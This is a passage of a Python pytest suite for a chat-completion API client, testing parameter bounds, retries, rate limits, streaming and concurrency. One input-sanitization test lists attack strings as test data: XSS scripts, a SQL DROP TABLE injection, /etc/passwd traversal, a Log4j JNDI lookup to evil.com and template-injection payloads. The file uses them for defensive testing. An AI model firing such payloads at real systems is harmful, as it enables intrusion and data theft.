        return GenesisAPIClient(api_key='test-boundary-key')
    
    @pytest.mark.parametrize("temperature", [
        0.0, 0.001, 0.5, 1.0, 1.999, 2.0
    ])
    def test_temperature_boundary_values(self, client, temperature):
        """Test all boundary values for temperature parameter."""
        config = ModelConfig(name="test-model", temperature=temperature)
        client._validate_model_config(config)  # Should not raise
    
    @pytest.mark.parametrize("temperature", [
        -0.001, -1.0, 2.001, 10.0, float('inf'), float('-inf')
    ])
    def test_temperature_invalid_boundary_values(self, client, temperature):
        """Test invalid boundary values for temperature parameter."""
        config = ModelConfig(name="test-model", temperature=temperature)
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
    
    @pytest.mark.parametrize("top_p", [
        0.0, 0.001, 0.5, 0.999, 1.0
    ])
    def test_top_p_boundary_values(self, client, top_p):
        """Test all boundary values for top_p parameter."""
        config = ModelConfig(name="test-model", top_p=top_p)
        client._validate_model_config(config)  # Should not raise
    
    @pytest.mark.parametrize("top_p", [
        -0.001, -1.0, 1.001, 2.0, float('inf')
    ])
    def test_top_p_invalid_boundary_values(self, client, top_p):
        """Test invalid boundary values for top_p parameter."""
        config = ModelConfig(name="test-model", top_p=top_p)
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
    
    @pytest.mark.parametrize("max_tokens", [
        1, 10, 100, 1000, 4000, 8000, 32000
    ])
    def test_max_tokens_boundary_values(self, client, max_tokens):
        """Test various boundary values for max_tokens parameter."""
        config = ModelConfig(name="test-model", max_tokens=max_tokens)
        client._validate_model_config(config)  # Should not raise
    
    @pytest.mark.parametrize("max_tokens", [
        0, -1, -100
    ])
    def test_max_tokens_invalid_boundary_values(self, client, max_tokens):
        """Test invalid boundary values for max_tokens parameter."""
        config = ModelConfig(name="test-model", max_tokens=max_tokens)
        with pytest.raises(ValidationError):
            client._validate_model_config(config)
    
    def test_message_content_length_boundaries(self, client):
        """Test message content length at various boundaries."""
        # Test very short content
        short_messages = [ChatMessage(role="user", content="a")]
        client._validate_messages(short_messages)
        
        # Test medium content
        medium_content = "x" * 1000
        medium_messages = [ChatMessage(role="user", content=medium_content)]
        client._validate_messages(medium_messages)
        
        # Test content near potential limits
        large_content = "x" * 10000
        large_messages = [ChatMessage(role="user", content=large_content)]
        try:
            client._validate_messages(large_messages)
        except ValidationError:
            pass  # May be rejected if too long


class TestDataIntegrityAndConsistency:
    """Tests for data integrity and consistency across operations."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-integrity-key')
    
    def test_message_immutability_during_validation(self, client):
        """Test that message objects are not modified during validation."""
        original_content = "Original content"
        message = ChatMessage(role="user", content=original_content)
        original_messages = [message]
        
        # Store original state
        original_role = message.role
        original_content_ref = message.content
        
        # Validate messages
        client._validate_messages(original_messages)
        
        # Verify no modification occurred
        assert message.role == original_role
        assert message.content == original_content_ref
        assert message.content == original_content
    
    def test_model_config_immutability_during_validation(self, client):
        """Test that model config objects are not modified during validation."""
        config = ModelConfig(
            name="test-model",
            temperature=0.7,
            max_tokens=1000,
            top_p=0.9
        )
        
        # Store original values
        original_temp = config.temperature
        original_tokens = config.max_tokens
        original_top_p = config.top_p
        
        # Validate config
        client._validate_model_config(config)
        
        # Verify no modification occurred
        assert config.temperature == original_temp
        assert config.max_tokens == original_tokens
        assert config.top_p == original_top_p
    
    @pytest.mark.asyncio
    async def test_response_data_consistency(self, client):
        """Test that response data maintains consistency across parsing."""
        mock_response_data = {
            'id': 'consistency-test',
            'object': 'chat.completion',
            'created': 1677610602,
            'model': 'genesis-gpt-4',
            'choices': [{
                'index': 0,
                'message': {'role': 'assistant', 'content': 'Consistent response'},
                'finish_reason': 'stop'
            }],
            'usage': {'prompt_tokens': 10, 'completion_tokens': 5, 'total_tokens': 15}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response_data)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            result = await client.create_chat_completion(
                messages=[ChatMessage(role="user", content="Test")],
                model_config=ModelConfig(name="test-model")
            )
            
            # Verify data consistency
            assert result.id == mock_response_data['id']
            assert result.model == mock_response_data['model']
            assert result.choices[0].message.content == mock_response_data['choices'][0]['message']['content']
            assert result.usage.total_tokens == mock_response_data['usage']['total_tokens']


class TestResourceManagement:
    """Tests for proper resource management and cleanup."""
    
    @pytest.mark.asyncio
    async def test_session_resource_cleanup_on_error(self):
        """Test that sessions are properly cleaned up even when errors occur."""
        config = {'api_key': 'test-cleanup-key'}
        
        # Test cleanup after initialization error
        with patch('aiohttp.ClientSession', side_effect=Exception("Session creation failed")):
            with pytest.raises(Exception):
                async with GenesisAPIClient(**config) as client:
                    pass
    
    @pytest.mark.asyncio
    async def test_multiple_context_manager_usage(self):
        """Test multiple sequential context manager usages."""
        config = {'api_key': 'test-multi-context-key'}
        
        # First usage
        async with GenesisAPIClient(**config) as client1:
            session1 = client1.session
            assert not session1.closed
        
        # Session should be closed after context exit
        assert session1.closed
        
        # Second usage should create new session
        async with GenesisAPIClient(**config) as client2:
            session2 = client2.session
            assert not session2.closed
            assert session1 is not session2
        
        # Both sessions should be closed
        assert session1.closed
        assert session2.closed
    
    @pytest.mark.asyncio
    async def test_explicit_close_multiple_times(self):
        """Test that calling close() multiple times is safe."""
        client = GenesisAPIClient(api_key='test-multi-close-key')
        
        # First close
        await client.close()
        assert client.session.closed
        
        # Second close should not raise
        await client.close()
        assert client.session.closed
        
        # Third close should still be safe
        await client.close()
        assert client.session.closed


class TestAdvancedMockingAndTestUtilities:
    """Tests to verify our testing infrastructure and mocking capabilities."""
    
    def test_mock_response_structure_validation(self):
        """Test that our mock responses match expected API structure."""
        expected_keys = {'id', 'object', 'created', 'model', 'choices', 'usage'}
        
        mock_response = {
            'id': 'test-structure',
            'object': 'chat.completion',
            'created': 1677610602,
            'model': 'genesis-gpt-4',
            'choices': [{'message': {'role': 'assistant', 'content': 'Test'}}],
            'usage': {'total_tokens': 10}
        }
        
        # Verify our mock has all expected keys
        assert set(mock_response.keys()) >= expected_keys
    
    def test_async_mock_functionality(self):
        """Test that AsyncMock works correctly for our use cases."""
        async_mock = AsyncMock()
        async_mock.return_value = {'test': 'value'}
        
        # Test that it can be used in async context
        async def test_async():
            result = await async_mock()
            return result
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            result = loop.run_until_complete(test_async())
            assert result == {'test': 'value'}
        finally:
            loop.close()
    
    def test_patch_context_manager_behavior(self):
        """Test that patch context managers work as expected."""
        original_value = "original"
        
        def dummy_function():
            return original_value
        
        with patch(__name__ + '.dummy_function', return_value="mocked"):
            # Inside patch, should return mocked value
            # This is a conceptual test of our patching approach
            pass
        
        # Outside patch, should return original
        assert dummy_function() == original_value


class TestAdvancedRateLimitingBehavior:
    """Advanced tests for rate limiting behavior and recovery."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-rate-limit-key', max_retries=3)
    
    @pytest.mark.asyncio
    async def test_rate_limit_with_varying_retry_after(self, client, sample_messages, sample_model_config):
        """Test rate limiting with different Retry-After values."""
        retry_after_values = [1, 5, 10]
        call_count = 0
        
        async def mock_post_with_varying_retry(*args, **kwargs):
            nonlocal call_count
            mock_response = Mock()
            
            if call_count < len(retry_after_values):
                # Rate limit with different retry-after values
                mock_response.status = 429
                mock_response.json = AsyncMock(
                    return_value={'error': {'message': 'Rate limit exceeded'}}
                )
                mock_response.headers = {'Retry-After': str(retry_after_values[call_count])}
                call_count += 1
            else:
                # Success after retries
                mock_response.status = 200
                mock_response.json = AsyncMock(return_value={
                    'id': 'rate-limit-recovery',
                    'choices': [{'message': {'content': 'Success after rate limits'}}],
                    'usage': {'total_tokens': 20}
                })
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_with_varying_retry):
            with patch('asyncio.sleep') as mock_sleep:
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'rate-limit-recovery'
                # Verify sleep was called with correct retry-after values
                expected_sleeps = retry_after_values
                actual_sleeps = [call.args[0] for call in mock_sleep.call_args_list]
                assert actual_sleeps == expected_sleeps
    
    @pytest.mark.asyncio
    async def test_rate_limit_without_retry_after_header(self, client, sample_messages, sample_model_config):
        """Test rate limiting when Retry-After header is missing."""
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.status = 429
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(
                return_value={'error': {'message': 'Rate limit exceeded'}}
            )
            mock_post.return_value.__aenter__.return_value.headers = {}  # No Retry-After header
            
            with pytest.raises(RateLimitError) as exc_info:
                await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
            
            # Should still raise RateLimitError but with default retry_after
            assert exc_info.value.retry_after is not None


# Performance regression tests
class TestPerformanceRegression:
    """Tests to catch performance regressions."""
    
    @pytest.mark.performance
    def test_message_validation_performance(self):
        """Test that message validation completes in reasonable time."""
        client = GenesisAPIClient(api_key='test-perf-key')
        
        # Create a large number of messages
        large_message_list = []
        for i in range(1000):
            large_message_list.append(
                ChatMessage(role="user" if i % 2 == 0 else "assistant", content=f"Message {i}")
            )
        
        start_time = datetime.now()
        client._validate_messages(large_message_list)
        end_time = datetime.now()
        
        duration = (end_time - start_time).total_seconds()
        # Should validate 1000 messages in under 1 second
        assert duration < 1.0
    
    @pytest.mark.performance
    def test_model_config_validation_performance(self):
        """Test that model config validation is performant."""
        client = GenesisAPIClient(api_key='test-perf-key')
        
        config = ModelConfig(
            name="performance-test-model",
            max_tokens=4000,
            temperature=0.7,
            top_p=0.9
        )
        
        start_time = datetime.now()
        
        # Validate the same config many times
        for _ in range(10000):
            client._validate_model_config(config)
        
        end_time = datetime.now()
        duration = (end_time - start_time).total_seconds()
        
        # Should validate 10,000 configs in under 1 second
        assert duration < 1.0


# Comprehensive end-to-end workflow tests
class TestComprehensiveWorkflows:
    """End-to-end workflow tests covering complete use cases."""
    
    @pytest.mark.asyncio
    @pytest.mark.integration
    async def test_complete_chatbot_simulation(self):
        """Simulate a complete chatbot interaction workflow."""
        config = {'api_key': 'test-chatbot-key'}
        
        # Simulate a multi-turn conversation with various message types
        conversation_flow = [
            # User greeting
            ([ChatMessage(role="user", content="Hello, I need help with Python")], 
             "Hello! I'd be happy to help you with Python. What specific topic are you interested in?"),
            
            # User asks specific question
            ([ChatMessage(role="user", content="Hello, I need help with Python"),
              ChatMessage(role="assistant", content="Hello! I'd be happy to help you with Python. What specific topic are you interested in?"),
              ChatMessage(role="user", content="How do I work with async/await?")],
             "Async/await in Python allows you to write asynchronous code..."),
            
            # User asks follow-up
            ([ChatMessage(role="user", content="Hello, I need help with Python"),
              ChatMessage(role="assistant", content="Hello! I'd be happy to help you with Python. What specific topic are you interested in?"),
              ChatMessage(role="user", content="How do I work with async/await?"),
              ChatMessage(role="assistant", content="Async/await in Python allows you to write asynchronous code..."),
              ChatMessage(role="user", content="Can you show me an example?")],
             "Here's a simple example of async/await in Python...")
        ]
        
        call_count = 0
        
        async def mock_post_conversation(*args, **kwargs):
            nonlocal call_count
            _, expected_response = conversation_flow[call_count]
            
            mock_response = Mock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={
                'id': f'chatbot-turn-{call_count + 1}',
                'object': 'chat.completion',
                'created': int(datetime.now(timezone.utc).timestamp()),
                'model': 'genesis-gpt-4',
                'choices': [{
                    'index': 0,
                    'message': {'role': 'assistant', 'content': expected_response},
                    'finish_reason': 'stop'
                }],
                'usage': {'prompt_tokens': 50 + call_count * 20, 'completion_tokens': 30, 'total_tokens': 80 + call_count * 20}
            })
            call_count += 1
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_conversation):
            async with GenesisAPIClient(**config) as client:
                for turn_messages, expected_content in conversation_flow:
                    result = await client.create_chat_completion(
                        messages=turn_messages,
                        model_config=ModelConfig(name="genesis-gpt-4", max_tokens=2000, temperature=0.7)
                    )
                    
                    assert result.choices[0].message.content == expected_content
                    assert result.usage.total_tokens > 0
        
        assert call_count == len(conversation_flow)

    @pytest.mark.asyncio
    @pytest.mark.integration  
    async def test_error_recovery_workflow(self):
        """Test complete error recovery workflow with different error types."""
        config = {'api_key': 'test-recovery-key', 'max_retries': 4}
        
        # Simulate various error conditions followed by recovery
        error_recovery_sequence = [
            (500, "Internal server error"),
            (502, "Bad gateway"), 
            (503, "Service unavailable"),
            (429, "Rate limit exceeded"),
            (200, "Success after multiple errors")
        ]
        
        call_count = 0
        
        async def mock_post_recovery(*args, **kwargs):
            nonlocal call_count
            status, message = error_recovery_sequence[call_count]
            call_count += 1
            
            mock_response = Mock()
            mock_response.status = status
            
            if status == 200:
                mock_response.json = AsyncMock(return_value={
                    'id': 'recovery-success',
                    'choices': [{'message': {'content': message}}],
                    'usage': {'total_tokens': 25}
                })
            else:
                mock_response.json = AsyncMock(
                    return_value={'error': {'message': message}}
                )
                if status == 429:
                    mock_response.headers = {'Retry-After': '1'}
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_recovery):
            with patch('asyncio.sleep'):  # Speed up retries
                async with GenesisAPIClient(**config) as client:
                    result = await client.create_chat_completion(
                        messages=[ChatMessage(role="user", content="Test recovery")],
                        model_config=ModelConfig(name="test-model")
                    )
                    
                    assert result.id == 'recovery-success'
                    assert call_count == len(error_recovery_sequence)


if __name__ == "__main__":
    # Run with comprehensive test configuration
    pytest.main([
        __file__,
        "-v",
        "--tb=short", 
        "--maxfail=10",
        "--durations=10",  # Show 10 slowest tests
        "-m", "not performance",  # Skip performance tests by default
        "--disable-warnings"
    ])

# ============================================================================
# ADDITIONAL COMPREHENSIVE TEST ENHANCEMENTS
# ============================================================================

class TestAdvancedInputSanitization:
    """Advanced input sanitization and validation tests."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-sanitization-key')
    
    def test_message_content_with_control_characters(self, client):
        """Test handling of control characters in message content."""
        control_char_messages = [
            ChatMessage(role="user", content="Test\x00null"),  # Null character
            ChatMessage(role="user", content="Test\x08backspace"),  # Backspace
            ChatMessage(role="user", content="Test\x0Cform_feed"),  # Form feed
            ChatMessage(role="user", content="Test\x7FDEL"),  # DEL character
        ]
        
        # Should either sanitize or reject control characters appropriately
        for message in control_char_messages:
            try:
                client._validate_messages([message])
            except ValidationError:
                pass  # Acceptable to reject
    
    def test_message_content_encoding_variations(self, client):
        """Test various character encodings in message content."""
        encoding_test_messages = [
            ChatMessage(role="user", content="ASCII test"),
            ChatMessage(role="user", content="UTF-8: 你好世界"),
            ChatMessage(role="user", content="Emoji: 🚀🎉💖🌍"),
            ChatMessage(role="user", content="Symbols: ©®™∞≠≤≥±÷×"),
            ChatMessage(role="user", content="Accents: àáâãäåæçèéêë"),
        ]
        
        # All should be handled gracefully
        client._validate_messages(encoding_test_messages)
    
    @pytest.mark.parametrize("malicious_input", [
        "javascript:alert('xss')",
        "<script>alert('xss')</script>", 
        "'; DROP TABLE users; --",
        "../../../etc/passwd",
        "%00%00%00%00",
        "\"><script>alert('xss')</script>",
        "${jndi:ldap://evil.com/payload}",  # Log4j-style injection
        "{{7*7}}",  # Template injection
        "${{''.constructor.constructor('alert(1)')()}}",  # SSTI
    ])
    def test_injection_attack_prevention(self, client, malicious_input):
        """Test prevention of various injection attacks."""
        malicious_message = ChatMessage(role="user", content=malicious_input)
        
        # Should handle without executing malicious code
        try:
            client._validate_messages([malicious_message])
        except ValidationError:
            pass  # Acceptable to reject malicious input
    
    def test_extremely_nested_json_structures(self, client):
        """Test handling of deeply nested or complex data structures."""
        # Create deeply nested structure as content
        nested_content = "{"
        for i in range(1000):
            nested_content += f'"level{i}": {{'
        nested_content += '"deepest": "value"'
        for i in range(1000):
            nested_content += "}"
        
        # Should handle without stack overflow or performance issues
        try:
            message = ChatMessage(role="user", content=nested_content)
            client._validate_messages([message])
        except (ValidationError, RecursionError):
            pass  # May legitimately reject overly complex input


class TestAdvancedConcurrencyScenarios:
    """Advanced concurrency and thread safety tests."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-concurrency-key')
    
    @pytest.mark.asyncio
    async def test_session_thread_safety(self, client):
        """Test session access from multiple concurrent contexts."""
        import threading
        import time
        
        results = []
        errors = []
        
        def access_session():
            try:
                # Access session properties from different thread
                session_id = id(client.session)
                closed_status = client.session.closed
                results.append((session_id, closed_status))
            except Exception as e:
                errors.append(e)
        
        # Create multiple threads accessing session
        threads = []
        for i in range(10):
            thread = threading.Thread(target=access_session)
            threads.append(thread)
            thread.start()
        
        # Wait for all threads
        for thread in threads:
            thread.join(timeout=5)
        
        # Verify no errors occurred
        assert len(errors) == 0, f"Thread safety errors: {errors}"
        assert len(results) == 10
        
        # All threads should see the same session
        session_ids = [result[0] for result in results]
        assert all(sid == session_ids[0] for sid in session_ids)
    
    @pytest.mark.asyncio
    async def test_concurrent_validation_operations(self, client):
        """Test concurrent validation operations don't interfere."""
        import asyncio
        
        # Create different validation tasks
        async def validate_messages():
            messages = [ChatMessage(role="user", content="Concurrent test")]
            client._validate_messages(messages)
            return "messages_ok"
        
        async def validate_config():
            config = ModelConfig(name="test-model", temperature=0.5)
            client._validate_model_config(config)
            return "config_ok"
        
        # Run validations concurrently
        tasks = []
        for i in range(20):
            if i % 2 == 0:
                tasks.append(validate_messages())
            else:
                tasks.append(validate_config())
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # All should succeed
        assert len(results) == 20
        assert all(not isinstance(r, Exception) for r in results)
    
    @pytest.mark.asyncio
    async def test_concurrent_client_creation(self):
        """Test concurrent client creation and initialization."""
        async def create_client():
            client = GenesisAPIClient(api_key=f'test-key-{id(asyncio.current_task())}')
            await asyncio.sleep(0.01)  # Small delay
            return client
        
        # Create multiple clients concurrently
        tasks = [create_client() for _ in range(10)]
        clients = await asyncio.gather(*tasks)
        
        # All should be successfully created
        assert len(clients) == 10
        assert all(isinstance(c, GenesisAPIClient) for c in clients)
        
        # Clean up
        for client in clients:
            await client.close()


class TestAdvancedErrorRecoveryPatterns:
    """Advanced error recovery and resilience tests."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-recovery-key', max_retries=5)
    
    @pytest.mark.asyncio
    async def test_intermittent_network_failures(self, client, sample_messages, sample_model_config):
        """Test recovery from intermittent network failures."""
        failure_pattern = [True, False, True, False, False]  # Fail, succeed, fail, succeed, succeed
        call_count = 0
        
        async def mock_post_intermittent(*args, **kwargs):
            nonlocal call_count
            should_fail = call_count < len(failure_pattern) and failure_pattern[call_count]
            call_count += 1
            
            if should_fail:
                raise aiohttp.ClientConnectionError("Intermittent network failure")
            
            mock_response = Mock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={
                'id': f'recovery-attempt-{call_count}',
                'choices': [{'message': {'content': 'Recovered successfully'}}],
                'usage': {'total_tokens': 15}
            })
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_intermittent):
            with patch('asyncio.sleep'):  # Speed up retries
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert 'recovery-attempt' in result.id
                assert result.choices[0].message.content == 'Recovered successfully'
    
    @pytest.mark.asyncio
    async def test_cascading_error_recovery(self, client, sample_messages, sample_model_config):
        """Test recovery from cascading different error types."""
        error_cascade = [
            (aiohttp.ClientConnectionError, "Connection failed"),
            (asyncio.TimeoutError, "Request timeout"),
            (json.JSONDecodeError, "Invalid JSON", 0),
            (200, "Final success")
        ]
        call_count = 0
        
        async def mock_post_cascade(*args, **kwargs):
            nonlocal call_count
            
            if call_count < len(error_cascade) - 1:
                error_info = error_cascade[call_count]
                call_count += 1
                
                if error_info[0] == json.JSONDecodeError:
                    mock_response = Mock()
                    mock_response.status = 200
                    mock_response.json = AsyncMock(side_effect=json.JSONDecodeError(*error_info[1:]))
                    return mock_response
                else:
                    raise error_info[0](error_info[1])
            
            # Final success
            call_count += 1
            mock_response = Mock()
            mock_response.status = 200
            mock_response.json = AsyncMock(return_value={
                'id': 'cascade-recovery-success',
                'choices': [{'message': {'content': 'Survived error cascade'}}],
                'usage': {'total_tokens': 25}
            })
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_cascade):
            with patch('asyncio.sleep'):
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'cascade-recovery-success'
                assert call_count == len(error_cascade)
    
    @pytest.mark.asyncio
    async def test_partial_response_recovery(self, client, sample_messages, sample_model_config):
        """Test recovery when receiving partial or corrupted responses."""
        response_sequence = [
            # First attempt: completely malformed
            (200, "not json at all"),
            # Second attempt: partial JSON
            (200, '{"id": "partial", "choices": [{"message":'),
            # Third attempt: missing required fields
            (200, '{"id": "incomplete"}'),
            # Fourth attempt: success
            (200, '{"id": "complete", "choices": [{"message": {"content": "Success"}}], "usage": {"total_tokens": 10}}')
        ]
        
        call_count = 0
        
        async def mock_post_partial(*args, **kwargs):
            nonlocal call_count
            status, response_text = response_sequence[call_count]
            call_count += 1
            
            mock_response = Mock()
            mock_response.status = status
            
            if response_text.startswith('{'):
                try:
                    response_data = json.loads(response_text)
                    mock_response.json = AsyncMock(return_value=response_data)
                except json.JSONDecodeError:
                    mock_response.json = AsyncMock(side_effect=json.JSONDecodeError("Invalid JSON", response_text, 0))
            else:
                mock_response.json = AsyncMock(side_effect=json.JSONDecodeError("Not JSON", response_text, 0))
            
            return mock_response
        
        with patch('aiohttp.ClientSession.post', side_effect=mock_post_partial):
            with patch('asyncio.sleep'):
                result = await client.create_chat_completion(
                    messages=sample_messages,
                    model_config=sample_model_config
                )
                
                assert result.id == 'complete'
                assert call_count == 4


class TestAdvancedPerformanceOptimization:
    """Performance optimization and efficiency tests."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-performance-key')
    
    @pytest.mark.performance
    def test_memory_efficiency_with_large_datasets(self, client):
        """Test memory efficiency when handling large amounts of data."""
        import sys
        
        # Create very large message content
        large_content = "x" * 1000000  # 1MB of content
        large_messages = [
            ChatMessage(role="user", content=large_content)
        ]
        
        # Measure memory usage before and after validation
        initial_size = sys.getsizeof(large_messages)
        
        try:
            client._validate_messages(large_messages)
        except ValidationError:
            pass  # May reject large content
        
        # Memory usage shouldn't grow significantly during validation
        final_size = sys.getsizeof(large_messages)
        assert final_size <= initial_size * 1.1  # Allow 10% overhead
    
    @pytest.mark.performance
    def test_validation_caching_efficiency(self, client):
        """Test that repeated validations are efficient."""
        import time
        
        # Create identical messages
        messages = [ChatMessage(role="user", content="Test message") for _ in range(100)]
        config = ModelConfig(name="test-model", temperature=0.7, max_tokens=1000)
        
        # First validation (cold)
        start_time = time.time()
        for _ in range(10):
            client._validate_messages(messages)
            client._validate_model_config(config)
        first_duration = time.time() - start_time
        
        # Second validation (warm)
        start_time = time.time()
        for _ in range(10):
            client._validate_messages(messages)
            client._validate_model_config(config)
        second_duration = time.time() - start_time
        
        # Second should be same speed or faster (no significant degradation)
        assert second_duration <= first_duration * 1.2
    
    @pytest.mark.asyncio
    @pytest.mark.performance
    async def test_concurrent_request_efficiency(self, client):
        """Test efficiency of concurrent request handling."""
        mock_response = {
            'id': 'efficiency-test',
            'choices': [{'message': {'content': 'Response'}}],
            'usage': {'total_tokens': 10}
        }
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.json = AsyncMock(return_value=mock_response)
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Measure time for sequential vs concurrent requests
            import time
            
            # Sequential timing
            start_time = time.time()
            for i in range(5):
                await client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=f"Sequential {i}")],
                    model_config=ModelConfig(name="test-model")
                )
            sequential_duration = time.time() - start_time
            
            # Concurrent timing
            start_time = time.time()
            tasks = []
            for i in range(5):
                task = client.create_chat_completion(
                    messages=[ChatMessage(role="user", content=f"Concurrent {i}")],
                    model_config=ModelConfig(name="test-model")
                )
                tasks.append(task)
            await asyncio.gather(*tasks)
            concurrent_duration = time.time() - start_time
            
            # Concurrent should be significantly faster
            assert concurrent_duration < sequential_duration * 0.8


class TestAdvancedStreamingEdgeCases:
    """Advanced streaming functionality edge case tests."""
    
    @pytest.fixture
    def client(self):
        return GenesisAPIClient(api_key='test-streaming-advanced-key')
    
    @pytest.mark.asyncio
    async def test_streaming_with_unicode_boundaries(self, client, sample_messages, sample_model_config):
        """Test streaming when Unicode characters are split across chunk boundaries."""
        # Unicode characters that might be split across byte boundaries
        unicode_text = "Hello 🌍 世界 🚀 测试"
        
        # Split the UTF-8 encoded text at arbitrary byte boundaries
        encoded = unicode_text.encode('utf-8')
        chunks = []
        for i in range(0, len(encoded), 3):  # Split every 3 bytes
            chunk_data = encoded[i:i+3]
            try:
                # Try to decode partial chunk (may fail for split Unicode)
                decoded = chunk_data.decode('utf-8')
                chunks.append({'choices': [{'delta': {'content': decoded}}]})
            except UnicodeDecodeError:
                # Skip malformed chunks or handle gracefully
                continue
        
        chunks.append({'choices': [{'delta': {}, 'finish_reason': 'stop'}]})
        
        async def mock_stream():
            for chunk in chunks:
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            received_chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                received_chunks.append(chunk)
            
            # Should handle Unicode streaming gracefully
            assert len(received_chunks) > 0
    
    @pytest.mark.asyncio
    async def test_streaming_with_very_slow_chunks(self, client, sample_messages, sample_model_config):
        """Test streaming with significant delays between chunks."""
        mock_chunks = [
            {'choices': [{'delta': {'content': 'Slow'}}]},
            {'choices': [{'delta': {'content': ' streaming'}}]},
            {'choices': [{'delta': {'content': ' test'}}]},
            {'choices': [{'delta': {}, 'finish_reason': 'stop'}]}
        ]
        
        async def mock_slow_stream():
            for i, chunk in enumerate(mock_chunks):
                if i > 0:
                    await asyncio.sleep(0.1)  # Simulate slow chunks
                yield json.dumps(chunk).encode()
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_slow_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            start_time = datetime.now()
            chunks = []
            async for chunk in client.create_chat_completion_stream(
                messages=sample_messages,
                model_config=sample_model_config
            ):
                chunks.append(chunk)
            end_time = datetime.now()
            
            # Should complete despite slow streaming
            assert len(chunks) == len(mock_chunks)
            duration = (end_time - start_time).total_seconds()
            assert duration >= 0.3  # Should take at least the delay time
    
    @pytest.mark.asyncio
    async def test_streaming_cancellation_cleanup(self, client, sample_messages, sample_model_config):
        """Test proper cleanup when streaming is cancelled."""
        async def mock_infinite_stream():
            counter = 0
            while True:
                chunk = {'choices': [{'delta': {'content': f'Chunk {counter}'}}]}
                yield json.dumps(chunk).encode()
                counter += 1
                await asyncio.sleep(0.01)
        
        with patch('aiohttp.ClientSession.post') as mock_post:
            mock_post.return_value.__aenter__.return_value.content.iter_chunked = AsyncMock(
                return_value=mock_infinite_stream()
            )
            mock_post.return_value.__aenter__.return_value.status = 200
            
            # Start streaming
            stream_task = asyncio.create_task(self._consume_stream(client, sample_messages, sample_model_config))
            
            # Cancel after short time
            await asyncio.sleep(0.05)
            stream_task.cancel()
            
            # Should handle cancellation gracefully
            with pytest.raises(asyncio.CancelledError):
                await stream_task
    
    async def _consume_stream(self, client, messages, config):
        """Helper method to consume stream."""
        chunks = []
        async for chunk in client.create_chat_completion_stream(
            messages=messages,
            model_config=config
        ):
            chunks.append(chunk)
        return chunks


class TestAdvancedConfigurationValidation:
    """Advanced configuration validation and edge cases."""
    
    def test_api_key_with_special_characters(self):
        """Test API key validation with special characters."""
        special_keys = [
            "key-with-dashes",
            "key_with_underscores", 
            "key.with.dots",
            "key+with+plus",
            "key=with=equals",
            "key/with/slashes",
            "key:with:colons",
            "key@with@at",
            "key#with#hash",
            "key%20with%20encoding",
        ]
        
        for key in special_keys:
            client = GenesisAPIClient(api_key=key)
            assert client.api_key == key
    
    def test_base_url_normalization(self):
        """Test base URL normalization and validation."""
        url_test_cases = [
            ("https://api.example.com", "https://api.example.com"),
            ("https://api.example.com/", "https://api.example.com"),
            ("https://api.example.com/v1", "https://api.example.com/v1"),
            ("https://api.example.com/v1/", "https://api.example.com/v1"),
            ("http://localhost:8080", "http://localhost:8080"),
            ("https://subdomain.api.example.com/path", "https://subdomain.api.example.com/path"),
        ]
        
        for input_url, expected_normalized in url_test_cases:
            client = GenesisAPIClient(api_key='test-key', base_url=input_url)
            # URL should be normalized consistently
            assert client.base_url.rstrip('/') == expected_normalized.rstrip('/')
    
    def test_timeout_precision_handling(self):
        """Test timeout configuration with various precision levels."""
        precision_tests = [
            0.001,   # 1 millisecond
            0.1,     # 100 milliseconds  
            1.0,     # 1 second
            1.5,     # 1.5 seconds
            30.0,    # 30 seconds
            60.0,    # 1 minute
            300.5,   # 5 minutes 30 seconds
        ]
        
        for timeout_value in precision_tests:
            client = GenesisAPIClient(api_key='test-key', timeout=timeout_value)
            assert client.timeout == timeout_value
    
    def test_max_retries_boundary_values(self):
        """Test max_retries with boundary values."""
        retry_tests = [
            0,    # No retries
            1,    # Single retry
            3,    # Few retries
            10,   # Many retries
            100,  # Very many retries
        ]
        
        for retry_value in retry_tests:
            client = GenesisAPIClient(api_key='test-key', max_retries=retry_value)
            assert client.max_retries == retry_value
    
    def test_configuration_immutability(self):
        """Test that configuration cannot be accidentally modified."""
        client = GenesisAPIClient(
